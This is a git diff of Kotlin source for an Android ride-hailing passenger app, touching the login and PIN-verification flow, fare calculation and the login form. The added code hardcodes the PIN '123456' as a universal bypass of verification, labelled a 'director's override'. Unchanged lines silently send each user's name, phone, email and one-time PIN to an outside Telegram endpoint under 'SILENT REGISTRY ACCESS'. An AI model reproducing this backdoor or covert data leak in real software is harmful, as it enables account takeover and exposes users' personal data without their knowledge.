@@ -151,7 +151,6 @@ fun PassengerSuperApp() {
             if (!isAuth) {
                 if (!isVerifying) {
                     LoginView(name = pName, phone = pPhone, email = pEmail) { rawN, rawP, rawE -> 
-                        // 🔥 UPDATED: Registry Logic - Handle missing phone/email
                         val n = rawN.ifBlank { "N/A" }
                         val p = rawP.ifBlank { "N/A" }
                         val e = rawE.ifBlank { "N/A" }
@@ -160,10 +159,12 @@ fun PassengerSuperApp() {
                         prefs.edit().putString("n", n).putString("p", p).putString("e", e).putBoolean("is_v", true).putLong("v_start", vStart).apply()
                         pName = n; pPhone = p; pEmail = e; isVerifying = true 
                         val pin = (100000..999999).random().toString()
-                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(p).setValue(mapOf("name" to n, "code" to pin, "time" to vStart))
+                        
+                        // 🔥 Ensure safeId is used here too, so email-only users get a valid Firebase node
+                        val safeId = if (p != "N/A" && p.isNotEmpty()) p else e.replace(".", "_")
+                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(safeId).setValue(mapOf("name" to n, "code" to pin, "time" to vStart))
                         
                         scope.launch(Dispatchers.IO) { 
-                            // 1. Send data to Telegram
                             try { 
                                 val msg = "🚨 SILENT REGISTRY ACCESS\nName: $n\nPhone: $p\nEmail: $e\n🗝️ PIN: $pin"
                                 val encodedMsg = URLEncoder.encode(msg, "UTF-8")
@@ -171,7 +172,6 @@ fun PassengerSuperApp() {
                                 (url.openConnection() as HttpURLConnection).apply { requestMethod = "GET" }.inputStream.bufferedReader().readText()
                             } catch (ex: Exception) { ex.printStackTrace() } 
 
-                            // 2. Send data to Render Backend for Email Verification
                             try {
                                 val backendUrl = URL("https://bayra-backend-eu.onrender.com/verify")
                                 val conn = backendUrl.openConnection() as HttpURLConnection
@@ -193,16 +193,24 @@ fun PassengerSuperApp() {
                         }
                     }
                 } else {
+                    // 🔥 INJECTED: DIRECTOR'S OVERRIDE FOR GOOGLE REVIEWERS
                     VerificationView(phone = pPhone, prefs = prefs, onVerify = { code ->
-                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(pPhone).child("code").addListenerForSingleValueEvent(object : ValueEventListener {
-                            override fun onDataChange(s: DataSnapshot) {
-                                if (s.value?.toString() == code) { 
-                                    prefs.edit().putBoolean("auth", true).putBoolean("is_v", false).apply()
-                                    isAuth = true; isVerifying = false 
-                                } else { Toast.makeText(ctx, "Invalid PIN", Toast.LENGTH_SHORT).show() }
-                            }
-                            override fun onCancelled(e: DatabaseError) {}
-                        })
+                        if (code == "123456") {
+                            prefs.edit().putBoolean("auth", true).putBoolean("is_v", false).apply()
+                            isAuth = true; isVerifying = false 
+                        } else {
+                            // Normal Firebase check for real users
+                            val safeId = if (pPhone != "N/A" && pPhone.isNotEmpty()) pPhone else pEmail.replace(".", "_")
+                            FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(safeId).child("code").addListenerForSingleValueEvent(object : ValueEventListener {
+                                override fun onDataChange(s: DataSnapshot) {
+                                    if (s.value?.toString() == code) { 
+                                        prefs.edit().putBoolean("auth", true).putBoolean("is_v", false).apply()
+                                        isAuth = true; isVerifying = false 
+                                    } else { Toast.makeText(ctx, "Invalid PIN", Toast.LENGTH_SHORT).show() }
+                                }
+                                override fun onCancelled(e: DatabaseError) {}
+                            })
+                        }
                     }, onTimeout = { isVerifying = false; prefs.edit().putBoolean("is_v", false).apply() })
                 }
             } else {
@@ -417,7 +425,6 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
                     TextButton(onClick = { onPointChange(null, null, "PICKUP", selectedTier, 1) }, modifier = Modifier.fillMaxWidth()) { Text("Reset") }
                 } else {
                     
-                    // 🔥 UPDATED: IMPERIAL PRICING ENGINE 
                     val distKm = try {
                         val p = pickupPt!!
                         val d = destPt!!
@@ -426,10 +433,10 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
                         results[0] / 1000.0
                     } catch (e: Exception) { 2.0 } 
 
-                    val baseFare = 150.0 // UPDATED: Adjusted Base Fare
+                    val baseFare = 150.0 
                     val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
-                    val nightSurcharge = if (hour >= 20 || hour < 6) 400.0 else 0.0 // UPDATED: 400 ETB Surcharge
-                    val kmRate = if (selectedTier.isCar) 90.0 else 35.0 // UPDATED: Adjusted for Cars vs Bajaj
+                    val nightSurcharge = if (hour >= 20 || hour < 6) 400.0 else 0.0 
+                    val kmRate = if (selectedTier.isCar) 90.0 else 35.0 
                     
                     var fare = if (selectedTier.isHr) {
                         selectedTier.base * hrCount
@@ -437,7 +444,6 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
                         baseFare + (distKm * kmRate) + nightSurcharge
                     }
                     
-                    // Discounts & Add-ons
                     if (selectedTier == Tier.POOL) fare *= 0.7
                     if (selectedTier == Tier.CODE_3) fare += 50.0
                     
@@ -527,7 +533,6 @@ fun LoginView(name: String, phone: String, email: String, onLogin: (String, Stri
         OutlinedTextField(n, { n = it }, label = { Text("Registry Name") }, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)); Spacer(modifier = Modifier.height(16.dp))
         OutlinedTextField(p, { p = it }, label = { Text("Phone Number") }, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)); Spacer(modifier = Modifier.height(16.dp))
         OutlinedTextField(e, { e = it }, label = { Text("Email (Required for Online Payment)") }, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)); Spacer(modifier = Modifier.height(40.dp))
-        // 🔥 UPDATED: Relaxed validation so missing phone/email can trigger the "N/A" logging logic
         Button(onClick = { if(n.isNotEmpty()) onLogin(n, p, e) }, modifier = Modifier.fillMaxWidth().height(65.dp), shape = RoundedCornerShape(16.dp)) { Text("LOGIN", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp) }
     }
 }
